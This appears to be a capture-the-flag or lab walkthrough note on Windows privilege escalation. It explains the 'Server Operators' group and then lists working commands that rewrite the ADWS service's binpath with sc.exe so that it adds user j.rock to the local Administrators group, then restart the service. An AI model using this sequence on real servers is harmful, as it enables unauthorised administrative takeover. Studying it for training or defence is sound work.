Once you have connected the machine you can look for the user's (`j.rock`) services.

#evil-winrm
```
whoami /all
```

![[Screenshot_2025-10-22_04-54-26.png]]

## Group Server Operators

On **Windows**, the **“Server Operators”** group is a **built-in local group** that exists **on Windows Server editions** (not usually on Windows 10/11).

### 🧩 What the “Server Operators” group is

- **Built-in group** on Windows Server.
    
- Members can **perform administrative tasks on the server** without being full Administrators.
    
- Common privileges:
    
    - `Start/stop system services`
        
    - Manage shared resources (create/delete network shares)
        
    - Back up and restore files
        
    - Log on locally to the server
        
    - Shut down the system
        

> 🧠 They **can’t change security settings or install software** that affects all users — those actions require full Administrators.


## Start/stop system services

#evil-winrm 
Enumerate the services with the command `services`.

```
services
```

Use the ADWS Service.

![[Screenshot_2025-10-21_06-39-08.png]]

- Add the user `j.rock` to the local Administrators group.
```
sc.exe config adws binpath="net localgroup administrators j.rock /add"
```

**sc.exe config:** Modifies the configuration of an existing Windows service.

**adws:** Refers to the Active Directory Web Services — a legitimate Windows service.

**binpath=:** Specifies the executable path that the service will run when started.

**"net localgroup administrators j.rock /add":**  A command that adds the user j.rock to the local Administrators group.


- Stop the ADWS Service.
```
sc.exe stop adws
```

![[Screenshot_2025-10-22_04-58-24.png]]

- Start the ADWS Service.

```
sc.exe start adws
```

![[Screenshot_2025-10-22_04-58-24-1.png]]

- Exit the shell and log in again.

![[Screenshot_2025-10-22_05-18-34.png|901x639]]

Now you should be in the `administrators` group.

**Next step:** [[Administrator flag]]
